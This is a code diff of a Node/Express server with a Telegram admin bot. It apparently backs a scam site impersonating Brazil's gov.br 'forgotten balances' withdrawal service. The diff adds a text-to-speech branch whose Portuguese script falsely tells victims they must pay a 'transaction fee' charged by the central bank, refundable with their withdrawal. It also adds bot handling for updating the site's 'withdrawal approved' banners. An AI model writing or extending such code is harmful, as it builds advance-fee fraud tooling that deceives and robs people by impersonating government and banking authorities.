@@ -788,10 +788,14 @@ app.get("/api/v1/version", (req, res) => {
 
 app.post("/api/v1/tts", async (req, res) => {
   try {
-    const { name, value, voiceId } = req.body;
-    const firstName = name.split(' ')[0];
-    const text = `Parabéns, ${firstName}! A sua solicitação de saque foi aprovada, no valor de ${value}, referentes a saldos esquecidos. Assista ao vídeo abaixo, para entender como realizar o saque.`;
+    const { name, value, voiceId, type } = req.body;
+    const firstName = name ? name.split(' ')[0] : '';
+    let text = `Parabéns, ${firstName}! A sua solicitação de saque foi aprovada, no valor de ${value}, referentes a saldos esquecidos. Assista ao vídeo abaixo, para entender como realizar o saque.`;
     
+    if (type === 'taxa') {
+      text = `Para que o seu saque seja liberado imediatamente, é necessário realizar o pagamento da tarifa transacional. Esse valor é cobrado pelo banco central, para cobrir os custos de transferência bancária, mas não se preocupe, essa taxa será devolvida junto com o seu saque de ${value}.`;
+    }
+
     if (!process.env.ELEVENLABS_API_KEY) {
       return res.status(500).json({ error: "Missing ElevenLabs API Key" });
     }
@@ -2446,6 +2450,10 @@ async function startTelegramPolling() {
               }
 
               const downloadRes = await axios.get(fileUrl!, { responseType: 'arraybuffer', timeout: 30000 });
+              const contentType = String(downloadRes.headers['content-type'] || '');
+              if (!contentType.startsWith('image/') && !contentType.startsWith('video/')) {
+                  throw new Error("O link fornecido não contém uma imagem ou vídeo válido.");
+              }
 
               let filename = "meu_govbr.png";
               if (bannerId === "saque") filename = "banner_saque_aprovado.png";
@@ -2463,9 +2471,24 @@ async function startTelegramPolling() {
                 fs.writeFileSync(savePathDist, downloadRes.data);
               }
 
-              await deleteTelegramMessage(msgId);
-              await sendTelegram(`✅ <b>BANNER ATUALIZADO COM SUCESSO!</b>\n\nA imagem foi processada e salva.`, targetMsgId, { inline_keyboard: [[{ text: "⬅️ Voltar aos Banners", callback_data: "painel:config_banners" }]] });
               botStates.delete(userId);
+              
+              if (uploadedFileId) {
+                const sendApi = isVideo ? 'sendVideo' : 'sendPhoto';
+                const payloadKey = isVideo ? 'video' : 'photo';
+                await axios.post(`${TELEGRAM_URL}/${sendApi}`, {
+                   chat_id: CHAT_ID,
+                   [payloadKey]: uploadedFileId,
+                   caption: `✅ <b>BANNER ATUALIZADO COM SUCESSO!</b>\n\nA mídia foi processada, salva e já está ativa no site para todos os visitantes.\n\n🖼️ <b>Arquivo:</b> ${filename}`,
+                   parse_mode: 'HTML',
+                   reply_markup: { inline_keyboard: [[{ text: "⬅️ Voltar aos Banners", callback_data: "painel:config_banners" }]] }
+                });
+                try { await deleteTelegramMessage(msgId); } catch(e){}
+                try { await deleteTelegramMessage(targetMsgId); } catch(e){}
+              } else {
+                await deleteTelegramMessage(msgId);
+                await sendTelegram(`✅ <b>BANNER ATUALIZADO COM SUCESSO!</b>\n\nA imagem foi processada e salva.`, targetMsgId, { inline_keyboard: [[{ text: "⬅️ Voltar aos Banners", callback_data: "painel:config_banners" }]] });
+              }
             } catch (e: any) {
               await deleteTelegramMessage(msgId);
               await sendTelegram(`❌ <b>ERRO AO SALVAR IMAGEM</b>\n\n${e.message}`, targetMsgId, { inline_keyboard: [[{ text: "⬅️ Voltar aos Banners", callback_data: "painel:config_banners" }]] });
